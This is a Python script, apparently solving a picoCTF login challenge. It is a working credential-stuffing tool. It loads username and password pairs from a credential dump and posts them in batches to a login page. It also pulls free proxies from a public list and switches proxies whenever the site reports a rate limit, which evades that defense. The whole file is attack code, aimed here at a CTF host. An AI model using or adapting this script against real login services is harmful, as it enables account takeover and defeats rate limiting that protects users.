from typing import AsyncGenerator, Generator, Iterable

import aiohttp
import json

PROXY_SUPPLY_URL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=get_proxies&skip=0&proxy_format=protocolipport&format=json&limit=100"
CRED_CHUNK = 10
HOST = "candy-mountain.picoctf.net:58649"


async def get_proxies(session: aiohttp.ClientSession) -> AsyncGenerator[str, None]:
    while True:
        print("Fetching new proxies...")
        async with session.get(PROXY_SUPPLY_URL) as resp:
            if resp.status != 200:
                raise Exception(f"Failed to get proxy, status code: {resp.status}")
            proxies: dict = await resp.json()

            for proxy in proxies["proxies"]:
                if proxy["protocol"] != "http":
                    continue
                yield proxy["proxy"]


async def try_creds(
    session: aiohttp.ClientSession, creds: Iterable[tuple[str, str]]
) -> bool:
    for user, pw in creds:
        async with session.post(
            f"http://{HOST}/login", data={"username": user, "password": pw}
        ) as res:
            if res.status != 200:
                raise Exception(f"Failed to try creds, status code: {res.status}")
            text = await res.text()
            if "Invalid username or password" in text:
                print(f"Invalid creds: {user}:{pw}")
                continue

            if "Rate Limit Exceeded" in text:
                return False  # Invalidate this proxy and move on

            print(f"Found valid creds! Username: {user}, Password: {pw}")
            print(f"Response: {text}")
            return True
    return False


async def main():
    with open("creds-dump.txt", "r") as f:
        creds = [
            (x.split(";")[0], x.split(";")[1]) for x in f.read().strip().splitlines()
        ]
    cred_chunks = [creds[i : i + CRED_CHUNK] for i in range(0, len(creds), CRED_CHUNK)]

    tried_proxies = set()
    async for proxy in get_proxies(aiohttp.ClientSession()):
        print(f"Trying proxy: {proxy}")
        if proxy in tried_proxies:
            print(f"Already tried proxy {proxy}, skipping...")
            continue
        async with aiohttp.ClientSession(
            proxy=f"{proxy}", timeout=aiohttp.ClientTimeout(connect=2, total=10)
        ) as session:
            try:
                result = await try_creds(session, cred_chunks[0])
                cred_chunks = cred_chunks[1:]
                if result:
                    print(result)
                    return
            except Exception as e:
                print(f"Error with proxy {proxy}: {e}")
                continue


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())
